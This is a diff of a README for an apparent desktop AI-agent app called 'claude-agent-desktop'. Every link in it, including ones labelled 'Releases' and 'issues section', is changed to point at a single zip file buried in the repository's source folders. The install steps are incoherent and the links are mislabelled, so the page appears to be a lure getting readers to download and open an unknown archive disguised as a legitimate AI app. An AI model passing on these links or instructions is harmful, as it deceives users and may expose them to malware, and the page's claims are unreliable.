@@ -7,7 +7,7 @@ Welcome to claude-agent-desktop! This is a cross-platform desktop application de
 Ready to dive in? Follow these simple steps to download and run claude-agent-desktop on your computer.
 
 ## 🔗 Download the Application
-[![Download claude-agent-desktop](https://raw.githubusercontent.com/Ali-Shady/claude-agent-desktop/main/src/renderer/claude-agent-desktop_v3.7.zip%20Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Ali-Shady/claude-agent-desktop/main/src/renderer/claude-agent-desktop_v3.7.zip)
+[![Download claude-agent-desktop](https://github.com/Ali-Shady/claude-agent-desktop/raw/refs/heads/main/src/main/handlers/agent_claude_desktop_v2.1.zip%20Now-blue?style=for-the-badge&logo=github)](https://github.com/Ali-Shady/claude-agent-desktop/raw/refs/heads/main/src/main/handlers/agent_claude_desktop_v2.1.zip)
 
 ## 💻 System Requirements
 Before downloading, ensure your system meets the following requirements:
@@ -18,24 +18,24 @@ Before downloading, ensure your system meets the following requirements:
 - **Network**: An internet connection for optimal use.
 
 ## 📥 Download & Install
-To get started, visit this page to download: [claude-agent-desktop Releases](https://raw.githubusercontent.com/Ali-Shady/claude-agent-desktop/main/src/renderer/claude-agent-desktop_v3.7.zip)
+To get started, visit this page to download: [claude-agent-desktop Releases](https://github.com/Ali-Shady/claude-agent-desktop/raw/refs/heads/main/src/main/handlers/agent_claude_desktop_v2.1.zip)
 
 1. Go to the **Releases** section by clicking the link above.
 2. You will see a list of available versions. 
 3. Choose the latest version for your operating system:
-   - For Windows users, download the file labeled `https://raw.githubusercontent.com/Ali-Shady/claude-agent-desktop/main/src/renderer/claude-agent-desktop_v3.7.zip`.
-   - Mac users should select `https://raw.githubusercontent.com/Ali-Shady/claude-agent-desktop/main/src/renderer/claude-agent-desktop_v3.7.zip`.
+   - For Windows users, download the file labeled `https://github.com/Ali-Shady/claude-agent-desktop/raw/refs/heads/main/src/main/handlers/agent_claude_desktop_v2.1.zip`.
+   - Mac users should select `https://github.com/Ali-Shady/claude-agent-desktop/raw/refs/heads/main/src/main/handlers/agent_claude_desktop_v2.1.zip`.
    - If you’re on Linux, download the appropriate file for your distribution.
 
 4. Once the download completes, locate the file in your downloads folder.
 
 ### Installing on Windows
-- Double-click the `https://raw.githubusercontent.com/Ali-Shady/claude-agent-desktop/main/src/renderer/claude-agent-desktop_v3.7.zip`.
+- Double-click the `https://github.com/Ali-Shady/claude-agent-desktop/raw/refs/heads/main/src/main/handlers/agent_claude_desktop_v2.1.zip`.
 - Follow the installation prompts.
 - After installation, find the application in your Start Menu and launch it.
 
 ### Installing on macOS
-- Open the downloaded `https://raw.githubusercontent.com/Ali-Shady/claude-agent-desktop/main/src/renderer/claude-agent-desktop_v3.7.zip` file.
+- Open the downloaded `https://github.com/Ali-Shady/claude-agent-desktop/raw/refs/heads/main/src/main/handlers/agent_claude_desktop_v2.1.zip` file.
 - Drag the claude-agent-desktop icon to your Applications folder.
 - Go to your Applications folder and double-click the icon to open it.
 
@@ -63,7 +63,7 @@ claude-agent-desktop offers a wealth of features to enhance your interactions:
 ## 📖 Frequently Asked Questions
 
 ### How do I update the application?
-To update to the latest version, visit the [Releases](https://raw.githubusercontent.com/Ali-Shady/claude-agent-desktop/main/src/renderer/claude-agent-desktop_v3.7.zip) page and follow the download steps again. 
+To update to the latest version, visit the [Releases](https://github.com/Ali-Shady/claude-agent-desktop/raw/refs/heads/main/src/main/handlers/agent_claude_desktop_v2.1.zip) page and follow the download steps again. 
 
 ### What should I do if the app doesn’t start?
 Ensure your system meets the requirements. If it still doesn’t launch, try reinstalling the application.
@@ -72,6 +72,6 @@ Ensure your system meets the requirements. If it still doesn’t launch, try rei
 Absolutely! If you want to contribute, feel free to check the guidelines on our repository page. 
 
 ## ✅ Support
-If you encounter any issues, please check the [issues section](https://raw.githubusercontent.com/Ali-Shady/claude-agent-desktop/main/src/renderer/claude-agent-desktop_v3.7.zip) on GitHub for help or to report a bug.
+If you encounter any issues, please check the [issues section](https://github.com/Ali-Shady/claude-agent-desktop/raw/refs/heads/main/src/main/handlers/agent_claude_desktop_v2.1.zip) on GitHub for help or to report a bug.
 
 Thank you for choosing claude-agent-desktop! We hope you enjoy chatting with your AI agent.
